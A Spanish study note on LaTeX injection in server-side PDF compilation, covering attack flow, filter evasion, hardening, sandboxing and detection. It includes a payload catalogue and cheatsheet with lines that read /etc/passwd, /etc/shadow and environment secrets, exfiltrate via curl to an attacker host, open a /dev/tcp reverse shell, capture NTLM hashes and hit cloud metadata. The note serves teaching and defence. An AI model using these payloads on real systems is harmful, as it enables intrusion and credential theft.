---
tags:
  - ciberseguridad
  - web
  - inyecciones-latex
tipo: concepto
estado: terminado
---

# Inyecciones LaTeX

Las **inyecciones LaTeX** son un tipo de ataque que se aprovecha de las vulnerabilidades en las aplicaciones web que permiten a los usuarios ingresar **texto formateado** en LaTeX. LaTeX es un sistema de composición de textos que se utiliza comúnmente en la escritura académica y científica (ver [[Creación de Informes en LaTeX]] para el uso legítimo). Cuando una app **compila en el servidor** documentos LaTeX que contienen input de usuario, ese input se convierte en un **lenguaje de programación** que el motor TeX ejecuta con acceso al filesystem y, según la configuración, a la shell.

> [!info] Mecanismo de Ataque
> Los ataques de inyección LaTeX ocurren cuando un atacante ingresa código LaTeX malicioso en un campo de entrada de texto que luego es procesado por una aplicación web. Este código LaTeX puede ser diseñado para explotar vulnerabilidades en la aplicación, permitiendo la **ejecución de código malicioso** en el servidor subyacente.

## Mecánica: qué es realmente un motor TeX

`pdflatex`/`xelatex`/`lualatex` no son "renderizadores de texto": son **intérpretes de un lenguaje de tiposetting completo** (turing-complete) con primitivas de E/S:

| Primitiva | Qué hace | Peligro |
|---|---|---|
| `\input{archivo}` / `\include{archivo}` | Lee y "ejecuta" (expande) un archivo como si estuviera en el documento | **Lectura de ficheros**: `/etc/passwd`, configs, claves → van al PDF |
| `\openin` / `\read` | Abre y lee un stream de archivo con más control | Lectura selectiva |
| `\openout` / `\write` | Escribe archivos en disco | Escritura limitada por `openout_any` (por defecto `p`: no permite rutas con `..` ni directorios padre) |
| `\write18{comando}` / `\shellescape` | **Ejecuta un comando del sistema** | RCE si está habilitado sin restricciones |
| Pipe input `\input{\|ls -la}` | pdfTeX: ejecuta el comando y lee su stdout | RCE por otra vía (también requiere shell escape) |
| `\catcode`, `\csname`, `\expandafter` | Reescriben la sintaxis en tiempo de ejecución | **Ofuscación** para evadir listas negras |
| `\usepackage{pkg}` | Carga paquetes, algunos de los cuales ejecutan herramientas externas | `minted` (llama a Pygments), `pythontex`, `svg` (Inkscape), reglas de `epstopdf` |

### El estado de `\write18` hoy (corrección importante)

En TeX Live/MiKTeX modernos, **`\write18` está deshabilitado por defecto en modo "restringido"**:

| Modo | Flag | Qué permite |
|---|---|---|
| Deshabilitado | `-no-shell-escape` | Nada: `\write18` da error |
| **Restringido (default)** | `-shell-restricted` | Solo ~6 comandos internos seguros (`repstopdf`, `kpsewhich`...) — la mayoría de payloads de RCE **no** funcionan |
| Total | `-shell-escape` | Shell completa: `\write18{curl ...}` ejecuta |

Muchos entornos de lab/Docker y CI antiguos compilan con `-shell-escape` "para que funcione minted" — ahí el RCE es directo. **Nunca asumas el modo**: pruébalo (payload canario) y ajusta el impacto a lo observado. Con el modo restringido el ataque sigue siendo útil: lectura de ficheros (`\input`) y SSRF/NTLM-relay vía UNC.

> [!warning] Impacto real por modo
> - `-shell-escape`: RCE completa (el servidor ejecuta lo que escribas).
> - Restricto (default): lectura de cualquier fichero legible por el usuario del compilador, SSRF (`\includegraphics`/`\input` con URLs/UNC), DoS, escritura en el directorio de trabajo.
> - Nota: `\includegraphics{/etc/passwd}` **no** "ejecuta" el archivo como imagen: el motor lo lee (filtrando contenido en errores/log) o falla revelando existencia — el vector de lectura real es `\input`/`\openin`, no el grafo.

## Ejemplos de Explotación

Un ejemplo de una inyección LaTeX podría ser un ataque que aprovecha la capacidad de LaTeX para incluir archivos y comandos externos en una aplicación web. Un atacante podría enviar código LaTeX que incluya un enlace a un archivo malicioso o comandos que afecten al servidor que compila.

> [!tip] Catálogo de payloads LaTeX maliciosos
> | Payload | Efecto | Requisito |
> |---|---|---|
> | `\input{/etc/passwd}` | vuelca `/etc/passwd` dentro del PDF | siempre funciona (lectura) |
> | `\input{/proc/self/environ}` | env vars del proceso (secretos, tokens) | Linux |
> | `\typeout{SECRET}` | imprime en log/stdout lo que `\input` lea | para exfiltrar por logs/errores |
> | `\write18{curl http://ATTACKER/$(whoami)}` | RCE + exfil | `-shell-escape` |
> | `\input{\|id}` | ejecuta `id`, stdout al PDF | shell escape (pipe) |
> | `\input{\\ATTACKER\share\x}` | SMB/UNC: fuerza auth NTLM → robo de hash del host | Windows/salida de red |
> | `\includegraphics{http://ATTACKER/p.png}` | SSRF: el servidor descarga la URL | red abierta |
> | `\usepackage{minted}` + `\inputminted{..}{/etc/passwd}` | lectura "formateada" (Pygments) | `-shell-escape` |
> | `\@@input{/etc/shadow}` | variante de `\input` (ofuscación) | blacklist ingenua |
> | `\catcode`\i=11\relax ...` | reconstruye `\input` letra a letra | evasión de filtros por keyword |
> | `\whiledo{1}{...}` / recursion profunda | DoS por CPU/memoria | siempre |
> | `\pdfmdfivesum file{...}` / `\pdffilesize` | oráculo: existence/size/hash de ficheros sin ver el contenido | pdfTeX |

Ofuscación anti-blacklist, ejemplo: si filtran la cadena literal `input`:

```latex
\expandafter\input\expandafter{/etc/passwd}   % ejecución diferida
\csname input\endcsname{/etc/passwd}          % vía \csname
\catcode`\i=11 ...                             % reconstrucción del comando
```

## Notas de Laboratorio / práctica

### Flujo de explotación típico

1. **Localizar** dónde se compila LaTeX: formularios de "subir .tex", generadores de PDF (certificados, informes, facturas LaTeX como las de [[Creación de Informes en LaTeX]]), endpoints tipo `/render`, `/compile`, `/api/pdf`.
2. **Probar superficie**: envía texto benigno con `\typeout{CANARIO}` o un `\input{/etc/passwd}` canario y observa el PDF resultante y los errores.
3. **Clasificar el modo**: `\write18{id}` → si aparece salida de `id` en el PDF/errores, hay shell escape total. Si da error de "restricted", cambia a lectura de ficheros y SSRF.
4. **Explotar según modo**:
   - Lectura: `\input` de rutas candidatas (configs, `.env`, `id_rsa`, `/proc/self/environ`).
   - SSRF: `\includegraphics`/`\input` hacia `http://169.254.169.254/` (ver [[Server-Side Request Forgery (SSRF)]]) o UNC para capturar NTLM en Windows.
   - RCE: `\write18{bash -i >& /dev/tcp/ATTACKER/443 0>&1}` (documentado, no ejecutado en labs sin autorización).
5. **Exfiltrar**: el contenido leído se imprime en el PDF (lectura directa) o se envía con `\write18{curl ...}`. El PDF descargado por el atacante es el canal de retorno.

### Evasión de filtros

Las aplicaciones que "filtran comandos peligrosos" suelen hacer blacklist (`\input`, `\write18`, `\catcode`). Contra blacklist:

- Variants `\@@input`, `\csname input\endcsname`, `\expandafter`, mayúsculas/espaciado (`\ input` no vale, pero sí `\input` con comentarios intercalados: `\inp%` + newline + `ut{...}` funciona porque TeX junta líneas).
- Comentarios `%` dentro de comandos para romper detecciones de cadena.
- Cargar paquetes que internamente hacen `\input` (la blacklist no los conoce).

La única defensa sana es **allowlist de comandos + deshabilitar I/O peligroso en la configuración del motor**, no filtrar strings.

## Prevención y Mitigación

Para evitar las inyecciones LaTeX, las aplicaciones web deben validar y limpiar adecuadamente los datos que se reciben antes de procesarlos en LaTeX. Esto incluye la eliminación de caracteres especiales y la limitación de los comandos que pueden ser ejecutados en LaTeX.

> [!warning] Estrategias de Saneamiento
> Es crucial implementar una lista blanca (whitelist) de comandos y caracteres LaTeX permitidos, en lugar de una lista negra (blacklist). La lista negra es inherentemente insegura, ya que los atacantes pueden encontrar formas de evadirla. Se deben deshabilitar funciones peligrosas como `\write18` si no son estrictamente necesarias para la funcionalidad de la aplicación.

### 1. Compilar con el motor restringido y flags correctos

```bash
# ❌ Laboratorio "para que funcione" — RCE directa
pdflatex -shell-escape userdoc.tex

# ✅ modo restringido explícito + sin shell
pdflatex -no-shell-escape -interaction=nonstopmode -halt-on-error userdoc.tex
```

```ini
; texmf.cnf endurecido (aplica al engine)
openout_any = p    ; no escribir fuera del CWD ni con ..
openin_any  = p    ; no leer rutas arbitrarias (restringe \input)
shell_escape = f   ; jamás shell escape
```

### 2. Sanitizar la entrada con allowlist en la aplicación

```python
# ❌ blacklist ingenua (evadible con \csname, comentarios, etc.)
for bad in ["\\input", "\\write18", "\\catcode"]:
    tex = tex.replace(bad, "")

# ✅ allowlist: solo macros declaradas por la app; todo lo demás, texto escapado
ALLOWED = {"\\textbf", "\\textit", "\\emph", "\\href", "\\section"}
def compile_user_tex(user_text: str) -> str:
    # extraer macros usadas y validar contra allowlist
    used = set(re.findall(r"\\([a-zA-Z]+)", user_text))
    if not used <= ALLOWED:
        raise Rejected(f"macros no permitidas: {used - ALLOWED}")
    # neutralizar I/O de toda decisión residual
    for prim in (r"\\input", r"\\write", r"\\openin", r"\\openout",
                 r"\\catcode", r"\\csname", r"@@input", r"\\usepackage",
                 r"\\include", r"\\immediate", r"\\csname"):
        if re.search(prim, user_text):
            raise Rejected("primitiva de E/S bloqueada")
    return user_text
```

### 3. Aislamiento del compilador (defensa en profundidad)

```dockerfile
# ✅ Contenedor desechable: sin red, sin privilegios, con límites
FROM texlive/texlive:latest-small
RUN useradd -m compile && chown -R compile /work
USER compile
# ejecutar con: docker run --network=none --read-only --memory=512m --pids-limit=64
```

- **Sin red** (`--network=none`): mata SSRF y exfiltración por `\write18`/UNC.
- **Usuario no privilegiado**, filesystem read-only salvo el directorio de trabajo.
- **Límites** de CPU/memoria/pids: mitiga DoS por recursión.
- **Timeout** del proceso de compilación.
- Auditoría de logs del motor: patrones `\write18`, rutas sospechosas.

También es importante que las aplicaciones web se ejecuten con privilegios mínimos en la red y que se monitoreen regularmente las actividades de la aplicación para detectar posibles inyecciones.

> [!info] Defensa en Profundidad
> Además del saneamiento de entradas, otras medidas de seguridad importantes incluyen:
> *   **Principio de Mínimo Privilegio**: Ejecutar el proceso de compilación de LaTeX con los permisos de usuario más restrictivos posibles para limitar el daño potencial de una explotación.
> *   **Sandboxing**: Aislar el entorno de compilación de LaTeX en un contenedor o máquina virtual para limitar el impacto de una posible explotación al resto del sistema.
> *   **Monitoreo y Logging**: Registrar y analizar los intentos de compilación de LaTeX y los errores generados para detectar patrones de ataque o actividades sospechosas.
> *   **Actualizaciones**: Mantener el motor LaTeX y las librerías de la aplicación actualizadas para parchear vulnerabilidades conocidas y asegurar que se utilizan las versiones más seguras.
> *   **No compilar en el servidor de la app**: cola de trabajos + worker desechable es mejor aún que compilar in-process.

## Laboratorio Práctico

A continuación, se os proporciona el enlace correspondiente al proyecto de Github que nos descargamos para desplegar un laboratorio vulnerable donde poder practicar esta vulnerabilidad:

- Búsquedas de apps vulnerables de referencia: HackTricks LaTeX Injection (enlaces de labs Docker) — https://book.hacktricks.wiki/en/pentesting-web/unix-injection/latex-injection
- Práctica local segura: compilar los payloads canario de esta nota en un contenedor aislado sin red y con `-no-shell-escape`, comparando el PDF resultante entre modos.

### Receta: probar el modo de compilación de forma segura

Documentado como referencia de laboratorio (siempre en entorno aislado sin red y sin datos reales):

```bash
# 1) Desplegar el motor localmente en contenedor sin red
docker run --rm --network=none --memory=512m texlive/texlive:latest-small \
  pdflatex -interaction=nonstopmode canario.tex

# 2) canario.tex — clasificación de modo
# \typeout{MODO-TEST}          -> comprueba logging
# \input{/etc/passwd}          -> ¿lectura? (openin_any)
# \write18{id}                 -> ¿shell? (shell_escape)
# \includegraphics{http://x/}  -> ¿salida de red? (irrelevante con --network=none)

# 3) Comparar PDFs/log entre modos
#    -no-shell-escape  vs  (default restringido)  vs  -shell-escape
```

Con esa matriz (leerá / escribirá / ejecutará / red) defines el impacto real de la inyección en el objetivo antes de escalar payloads.

## Detección

| Señal | Indicador |
|---|---|
| El PDF devuelto contiene líneas de `/etc/passwd` o errores de TeX con rutas | `\input` funcionando → lectura de ficheros |
| Errores `Shell escape feature disabled` | `\write18` filtrado por el engine (modo restringido) |
| Requests salientes del worker a tu servidor tras enviar `\includegraphics{http://...}` | SSRF activo |
| Logs del compilador con `\write18` o rutas `/proc` | Intento de RCE en curso |

## Errores comunes

**Atacante:**
- Asumir `\write18` disponible: prueba el modo primero; en default moderno pierdes RCE pero ganas lectura — reorienta el ataque.
- Usar `\includegraphics` como vector de lectura de ficheros (no lo es: es SSRF/grafo; usa `\input`).
- No mirar los logs/errores del compilador: mitad de la información exfiltrada vive ahí.
- Enviar payloads gigantes sin comprobar timeout: el DoS puede reportarse como hallazgo aparte.

**Defensor:**
- Compilar con `-shell-escape` en producción porque "minted lo necesita" (mejor: precompilar fuentes o usar `fancyvrb` sin Pygments).
- Filtrar solo `\input` y `\write18` y dejar `\openin`, pipes `\input{|...}` o `\csname`.
- Correr el compilador como root con red en el servidor de la app.
- Confiar en que "nadie subirá .tex" — los PDFs generados dinámicamente (facturas, certificados) suelen interpolar datos de usuario dentro de plantillas TeX.

## Cheatsheet

```
# Canarios
\typeout{CANARIO}                      # ¿el motor ejecuta y loguea?
\input{/etc/passwd}                    # lectura
\write18{id}                           # RCE (¿shell-escape?)
\input{|id}                            # pipe (shell-escape)

# Lectura útil
\input{/proc/self/environ}
\input{/var/www/.env}
\input{\\ATTACKER\S\y}                 # UNC -> captura NTLM (Windows)

# SSRF
\includegraphics{http://169.254.169.254/latest/meta-data/}

# Evasión de blacklist
\csname input\endcsname{/etc/passwd}
\expandafter\input\expandafter{/etc/passwd}
\inp%\<newline>ut{/etc/passwd}         # comentarios partiendo tokens

# DoS
\whiledo{1=1}{aaaa}                    # recursión/bucle
```

## Laboratorios y referencias

- HackTricks — LaTeX Injection: https://book.hacktricks.wiki/en/pentesting-web/unix-injection/latex-injection
- PayloadsAllTheThings — LaTeX Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection
- Related internals: [[OS Command Injection]] · [[Server-Side Request Forgery (SSRF)]] · [[Path Traversal]] · [[Local File Inclusion]] · [[Abuso de Subida de Archivos]] · [[Creación de Informes en LaTeX]]
